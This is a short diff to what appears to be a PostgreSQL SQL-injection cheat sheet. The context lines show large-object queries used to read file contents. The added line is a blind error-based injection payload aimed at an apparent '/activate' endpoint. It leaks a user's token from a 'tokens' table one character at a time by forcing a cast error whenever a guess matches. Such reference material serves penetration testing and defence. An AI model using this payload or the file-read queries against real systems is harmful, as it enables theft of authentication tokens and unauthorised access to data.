@@ -203,6 +203,7 @@ NOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_fil
     SELECT lo_get(16420); -- use the OID returned from the above
     SELECT * from pg_largeobject; -- or just get all the large objects and their data
     ```
+    (select case when $${char}$$=(select SUBSTR(token,{index},1) from tokens where user_id=1 limit 1) then CAST((SELECT version()) AS INT) else 1 end)/activate
 
 ### PostgreSQL File Write
 
